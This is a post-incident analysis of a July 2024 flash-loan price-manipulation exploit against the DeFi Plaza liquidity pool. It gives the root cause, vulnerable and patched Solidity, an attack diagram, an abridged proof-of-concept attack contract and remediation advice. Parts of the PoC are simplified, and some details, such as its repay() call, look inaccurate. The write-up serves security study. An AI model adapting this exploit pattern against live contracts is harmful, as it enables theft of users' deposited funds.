# DeFi Plaza — Liquidity Pool Price Manipulation via Nested Flash Loans

| Field | Details |
|------|------|
| **Date** | 2024-07-01 |
| **Protocol** | DeFi Plaza |
| **Chain** | Ethereum |
| **Loss** | ~200,000 USD |
| **Attacker** | Address unconfirmed |
| **Attack Tx** | Address unconfirmed |
| **Vulnerable Contract** | DeFi Plaza LP Pool |
| **Root Cause** | `addMultiple()` uses spot price (reserve ratio) to calculate LP token minting — distorting the reserve ratio allows excessive LP token issuance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/DeFiPlaza_exp.sol) |

---

## 1. Vulnerability Overview

DeFi Plaza is a multi-asset DEX supporting 9 tokens: WBTC, LINK, DAI, AAVE, MKR, USDC, WETH, CRV, and USDT. The attacker borrowed 9 token types from Balancer via flash loan, then borrowed an additional 6 token types from Aave via a nested flash loan. Using the large token amounts to manipulate prices within DeFi Plaza, the attacker minted LP tokens at a favorable price via `addMultiple()`, immediately withdrew via `removeLiquidity()`, and drained approximately $200,000.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: addMultiple() mints LP tokens based on spot price
function addMultiple(
    uint256[] calldata amounts,
    uint256 minLP
) external returns (uint256 lpTokens) {
    // LP token calculation based on current pool balances — reflects flash-loan-manipulated price
    lpTokens = _calculateLP(amounts);  // ❌ spot price based
    require(lpTokens >= minLP, "Insufficient LP");
    _mintLP(msg.sender, lpTokens);
}

// ✅ Correct code: restrict large deposits within a single block
function addMultiple(
    uint256[] calldata amounts,
    uint256 minLP
) external returns (uint256 lpTokens) {
    require(!_sameBlockLargeDeposit(), "Flash loan guard");  // ✅ block-level defense
    lpTokens = _calculateLP(amounts);
    require(lpTokens >= minLP, "Insufficient LP");
    _mintLP(msg.sender, lpTokens);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► Balancer Flash Loan (WBTC, LINK, DAI, AAVE, MKR, USDC, WETH, CRV, USDT)
  │
  ├─[2]─► Aave Flash Loan (nested: 6 additional tokens borrowed)
  │
  ├─[3]─► DeFi Plaza multi-token swap to manipulate pool price
  │         └─► Distort reserve ratio of each token
  │
  ├─[4]─► Call addMultiple(88.8M × each token)
  │         └─► Mint LP tokens favorably at manipulated price
  │
  ├─[5]─► Immediately call removeLiquidity()
  │         └─► Withdraw tokens at imbalanced ratio
  │
  ├─[6]─► Normalize price via single-unit swap
  │
  ├─[7]─► Repay Aave flash loan (repay())
  ├─[8]─► Repay Balancer flash loan
  │
  └─[9]─► Net profit: ~200,000 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackContract {
    function testExploit() external {
        // [1] Simultaneous flash loan of 9 tokens from Balancer
        address[] memory tokens = new address[](9);
        tokens[0] = WBTC; tokens[1] = LINK; tokens[2] = DAI;
        // ... (AAVE, MKR, USDC, WETH, CRV, USDT)
        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(...) external {
        // [2] Nested Aave flash loan inside Balancer callback
        IAavePool(AAVE_POOL).flashLoan(address(this), aaveTokens, aaveAmounts, ...);
    }

    function executeOperation(...) external {
        // [3] Manipulate price via DeFi Plaza multi-token swap
        // Deposit 88.8M of each token into addMultiple
        uint256[] memory amounts = new uint256[](9);
        for (uint i = 0; i < 9; i++) amounts[i] = 88_800_000 ether;

        // [4] Mint LP tokens at manipulated price
        IDeFiPlaza(DEFI_PLAZA).addMultiple(amounts, 0);

        // [5] Immediately remove liquidity to withdraw tokens at imbalanced ratio
        uint256 lpBalance = IERC20(LP_TOKEN).balanceOf(address(this));
        IDeFiPlaza(DEFI_PLAZA).removeLiquidity(lpBalance, new uint256[](9));

        // [6] Repay Aave flash loan
        IERC20(USDC).approve(AAVE_POOL, type(uint256).max);
        IAavePool(AAVE_POOL).repay(USDC, aaveAmount, 2, address(this));
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Price Oracle Manipulation — `addMultiple()` LP token minting calculation is spot price (reserve ratio) based; reserve distortion enables excessive LP issuance |
| **Attack Technique** | Multi-token Pool Spot Price Manipulation + LP Drain (nested flash loans serve as auxiliary funding) |
| **DASP Category** | Price Oracle Manipulation |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | Critical |
| **Attack Complexity** | High |

## 6. Remediation Recommendations

1. **Single-block deposit restriction**: Add a guard that blocks large `addMultiple()` calls within the same block.
2. **TWAP-based LP minting**: Calculate LP token quantity using a time-weighted average price rather than the spot price.
3. **Flash loan reentrancy protection**: Use `nonReentrant` modifiers and flash loan detection flags.
4. **Nested flash loan detection**: Disable critical state-changing functions when nested callback calls are detected.

## 7. Lessons Learned

- **Risk of nested flash loans**: Defending against a single flash loan alone is insufficient to block a Balancer + Aave nested structure.
- **Complexity of multi-asset pools**: Multi-token pools expose far more attack vectors than single-token pools.
- **addLiquidity spot price dependency**: When a liquidity addition function references only the current reserve ratio, it is vulnerable to flash loan manipulation.